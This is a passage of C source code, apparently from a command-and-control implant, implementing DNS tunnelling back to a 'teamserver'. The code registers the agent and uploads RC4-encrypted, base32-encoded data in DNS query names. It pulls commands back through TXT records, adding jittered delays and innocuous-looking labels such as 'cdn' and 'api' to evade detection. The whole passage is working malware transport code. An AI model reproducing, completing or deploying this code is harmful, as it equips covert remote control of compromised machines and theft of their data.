        DnsBurstSleep = 50;

    DnsBurstJitter = Instance->Config.Transport.BurstJitter;
    if ( DnsBurstJitter > 90 )
        DnsBurstJitter = 90;

    {
        CHAR Resolvers[ 512 ] = { 0 };
        CHAR DohResolvers[ 512 ] = { 0 };

        if ( Instance->Config.Transport.Resolvers )
            WCharStringToCharString( Resolvers, Instance->Config.Transport.Resolvers, sizeof( Resolvers ) );

        if ( Instance->Config.Transport.DohResolvers )
            WCharStringToCharString( DohResolvers, Instance->Config.Transport.DohResolvers, sizeof( DohResolvers ) );

        DnsParseResolverList( Resolvers, DnsResolverList[ 0 ], 64, DNS_MAX_RESOLVERS, &DnsResolverCount );
        DnsParseResolverList( DohResolvers, DnsDohResolverList[ 0 ], 256, DNS_MAX_RESOLVERS, &DnsDohResolverCount );
    }

    if ( ! DnsResolverCount && ! DnsDohResolverCount )
    {
        StringCopyA( DnsResolverList[ 0 ], "8.8.8.8" );
        DnsResolverCount = 1;
    }

    for ( INT i = 7; i >= 0; i-- )
        DnsSessionId[ 7 - i ] = DnsHexDigits[ ( Instance->Session.AgentID >> ( i * 4 ) ) & 0xF ];

    DnsSessionId[ 8 ] = 0;

    DnsInitialized = TRUE;

    return TRUE;
}

/*! Returns the number of raw bytes that fit into a single query. */
/*! Returns the length of the DATA_LABELS of a payload of the given length.
 *
 * The payload is encoded with base32 and split into labels of at most 63
 * characters. Every split adds a separator to the name. */
static ULONG DnsDataLabelsLength(
    _In_ ULONG Length
) {
    ULONG Encoded = ( ( Length * 8 ) + 4 ) / 5;
    ULONG Labels  = ( Encoded + DNS_LABEL_SIZE - 1 ) / DNS_LABEL_SIZE;

    return Encoded + ( Labels > 0 ? Labels - 1 : 0 );
}

static ULONG DnsChunkCapacity(
    VOID
) {
    ULONG Prefix = 0;
    ULONG Available = 0;
    ULONG Capacity = 0;

    Prefix = ( ULONG ) StringLengthA( DnsSessionId ) + 1;  /* sid. */
    Prefix += 3 + 1;                                     /* op. */
    Prefix += 8 + 1;                                     /* sequence. */
    Prefix += 1 + 1;                                     /* index. */
    Prefix += ( ULONG ) StringLengthA( DnsDomain ) + 1;   /* domain. */

    if ( DNS_MAX_QNAME_TEXT <= Prefix )
        return 0;

    Available = DNS_MAX_QNAME_TEXT - Prefix;

    /* base32 needs eight bits for every five characters */
    Capacity = ( Available * 5 ) / 8;

    while ( Capacity > 0 && DnsDataLabelsLength( Capacity ) > Available )
        Capacity--;

    if ( Capacity <= DNS_FRAME_HEADER )
        return 0;

    Capacity -= DNS_FRAME_HEADER;

    if ( Capacity > DnsPacketSize )
        Capacity = DnsPacketSize;

    return Capacity;
}

/*! Encodes data and splits it into DNS labels. */
static BOOL DnsBuildDataLabels(
    _In_  PBYTE Data,
    _In_  ULONG Length,
    _Out_ PCHAR Out,
    _In_  ULONG OutSize
) {
    CHAR Encoded[ 1024 ] = { 0 };
    ULONG EncodedLength = 0;
    ULONG Written = 0;

    EncodedLength = DnsBase32Encode( Data, Length, Encoded, sizeof( Encoded ) );
    if ( ! EncodedLength )
        return FALSE;

    for ( ULONG i = 0; i < EncodedLength; i++ )
    {
        if ( Written + 1 >= OutSize )
            return FALSE;

        Out[ Written++ ] = Encoded[ i ];

        if ( ( i + 1 ) % DNS_LABEL_SIZE == 0 && i + 1 < EncodedLength )
        {
            if ( Written + 1 >= OutSize )
                return FALSE;

            Out[ Written++ ] = '.';
        }
    }

    Out[ Written ] = 0;

    return TRUE;
}

/*! Waits for the burst interval. */
static VOID DnsWait(
    _In_ ULONG Milliseconds
) {
    if ( ! Milliseconds )
        return;

    if ( Instance->Win32.WaitForSingleObjectEx )
    {
        Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), Milliseconds, FALSE );
        return;
    }

    if ( Instance->Win32.Sleep )
        Instance->Win32.Sleep( Milliseconds );
}

BOOL DnsBurstWait(
    VOID
) {
    DWORD Delay = 0;

    if ( ! DnsBurstEnabled )
        return FALSE;

    Delay = DnsBurstSleep;

    if ( DnsBurstJitter > 0 && DnsBurstJitter <= 90 )
    {
        DWORD Range = ( DnsBurstSleep * DnsBurstJitter ) / 100;
        DWORD Delta = DnsGetTickCount() % ( Range + 1 );

        Delay = ( DWORD ) ( DnsBurstSleep - ( Range / 2 ) + Delta );

        if ( Delay < 10 )
            Delay = 10;
    }

    DnsWait( Delay );

    return TRUE;
}

/*! Uploads a message in fragments and waits for the acknowledgement. */
static BOOL DnsUpload(
    _In_ PBYTE Data,
    _In_ ULONG Length,
    _In_ PCHAR Op
) {
    CHAR   QueryName[ DNS_MAX_NAME + 2 ] = { 0 };
    CHAR   Labels[ 1024 ] = { 0 };
    BYTE   Answer[ 64 ] = { 0 };
    PBYTE  Frame = NULL;
    ULONG  AnswerSize = 0;
    ULONG  Capacity = 0;
    ULONG  Offset = 0;
    ULONG  Chunk = 0;
    ULONG  Retries = 0;
    BOOL   IsPut = StringCompareA( Op, "cdn" ) == 0;

    Capacity = DnsChunkCapacity();
    if ( ! Capacity )
        return FALSE;

    if ( Length == 0 )
        return FALSE;

    while ( Offset < Length )
    {
        Chunk = Length - Offset;
        if ( Chunk > Capacity )
            Chunk = Capacity;

        Frame = ( PBYTE ) MmHeapAlloc( ( ULONG ) ( DNS_FRAME_HEADER + Chunk ) );
        if ( ! Frame )
            return FALSE;

        DnsWriteBe32( Frame, Length );
        DnsWriteBe32( Frame + 4, Offset );
        MemCopy( Frame + DNS_FRAME_HEADER, Data + Offset, ( SIZE_T ) Chunk );

        DnsRc4Crypt( Frame, DNS_FRAME_HEADER + Chunk, DnsEncryptKey, DNS_KEY_LENGTH );

        if ( ! DnsBuildDataLabels( Frame, DNS_FRAME_HEADER + Chunk, Labels, sizeof( Labels ) ) )
        {
            MmHeapFree( Frame );
            return FALSE;
        }

        MmHeapFree( Frame );
        Frame = NULL;

        if ( ! DnsBuildQueryName( DnsSessionId, Op, ++DnsSequence, "0", Labels, DnsDomain, QueryName, sizeof( QueryName ) ) )
            return FALSE;

        AnswerSize = 0;

        if ( ! DnsQueryWithRotation( QueryName, IsPut ? "A" : "TXT", Answer, sizeof( Answer ), &AnswerSize ) )
        {
            if ( IsPut )
                return FALSE;

            /* the registration packet is retried on the next exchange */
            return FALSE;
        }

        if ( ! IsPut )
        {
            Offset += Chunk;
            continue;
        }

        {
            BOOL    Complete = FALSE;
            BOOL    NeedsReset = FALSE;
            ULONG  NextExpected = 0;

            if ( AnswerSize >= 4 && ParsePutAckResponse( Answer, AnswerSize, &NextExpected, &Complete, &NeedsReset ) )
            {
                if ( NeedsReset )
                {
                    Offset = 0;
                    Retries++;

                    if ( Retries > 3 )
                        return FALSE;

                    continue;
                }

                if ( Complete )
                    break;

                if ( NextExpected > Offset && NextExpected <= Length )
                {
                    Offset = NextExpected;
                    continue;
                }
            }
        }

        Offset += Chunk;

        if ( DnsBurstEnabled )
            DnsBurstWait();
    }

    return TRUE;
}

/*! Downloads the answer of the teamserver. */
static BOOL DnsDownload(
    _Out_opt_ PBUFFER Resp
) {
    CHAR   QueryName[ DNS_MAX_NAME + 2 ] = { 0 };
    CHAR   Labels[ 256 ] = { 0 };
    CHAR   Answer[ 2048 ] = { 0 };
    BYTE   Request[ 4 ] = { 0 };
    BYTE   Binary[ 2048 ] = { 0 };
    PBYTE  Download = NULL;
    ULONG  DownloadTotal = 0;
    ULONG  AnswerSize = 0;
    ULONG  BinarySize = 0;
    ULONG  Total = 0;
    ULONG  Filled = 0;
    ULONG  Offset = 0;
    ULONG  Chunk = 0;
    ULONG  End = 0;

    for ( ULONG Attempt = 0; Attempt < DNS_MAX_FRAGMENTS; Attempt++ )
    {
        DnsWriteBe32( Request, Filled );
        DnsRc4Crypt( Request, sizeof( Request ), DnsEncryptKey, DNS_KEY_LENGTH );

        if ( ! DnsBuildDataLabels( Request, sizeof( Request ), Labels, sizeof( Labels ) ) )
            break;

        if ( ! DnsBuildQueryName( DnsSessionId, "api", ++DnsSequence, "0", Labels, DnsDomain, QueryName, sizeof( QueryName ) ) )
            break;

        AnswerSize = 0;

        if ( ! DnsQueryWithRotation( QueryName, "TXT", ( PBYTE ) Answer, sizeof( Answer ), &AnswerSize ) )
            break;

        if ( ! AnswerSize )
            break;

        BinarySize = DnsBase64Decode( Answer, AnswerSize, Binary, sizeof( Binary ) );
        if ( ! BinarySize )
            break;

        DnsRc4Crypt( Binary, BinarySize, DnsEncryptKey, DNS_KEY_LENGTH );

        if ( BinarySize < DNS_FRAME_HEADER )
            break;

        Total = DnsReadBe32( Binary );
        Offset = DnsReadBe32( Binary + 4 );
        Chunk = BinarySize - DNS_FRAME_HEADER;

        if ( ! Total || Total > DNS_MAX_REQUEST_LENGTH )
            break;

        if ( ! Download )
        {
            Download = ( PBYTE ) MmHeapAlloc( Total );
            if ( ! Download )
                break;

            DownloadTotal = Total;
            Filled = 0;
        }
        else if ( Total != DownloadTotal )
        {
            MmHeapFree( Download );
            Download = ( PBYTE ) MmHeapAlloc( Total );
            if ( ! Download )
                break;

            DownloadTotal = Total;
            Filled = 0;
        }

        if ( Offset > Total )
            break;

        End = Offset + Chunk;
        if ( End > Total )
            End = Total;

        MemCopy( Download + Offset, Binary + DNS_FRAME_HEADER, ( SIZE_T ) ( End - Offset ) );

        if ( End > Filled )
            Filled = End;

        if ( Filled >= Total )
        {
            if ( Resp )
            {
                Resp->Buffer = Download;
                Resp->Length = Total;
            }
            else
            {
                MmHeapFree( Download );
            }

            return TRUE;
        }

        if ( DnsBurstEnabled )
            DnsBurstWait();
    }

    if ( Download )
        MmHeapFree( Download );

    return FALSE;
}

BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    if ( Resp )
    {
        Resp->Buffer = NULL;
        Resp->Length = 0;
    }

    if ( ! Send || ! Send->Buffer || ! Send->Length )
        return FALSE;

    if ( ! DnsInitialize() )
        return FALSE;

    if ( ! DnsHiSent )
    {
        /* the first message carries the registration packet of the agent */
        if ( ! DnsUpload( Send->Buffer, Send->Length, "www" ) )
            return FALSE;

        DnsHiSent = TRUE;
    }
    else
    {
        if ( ! DnsUpload( Send->Buffer, Send->Length, "cdn" ) )
            return FALSE;
    }

    return DnsDownload( Resp );
}

#endif
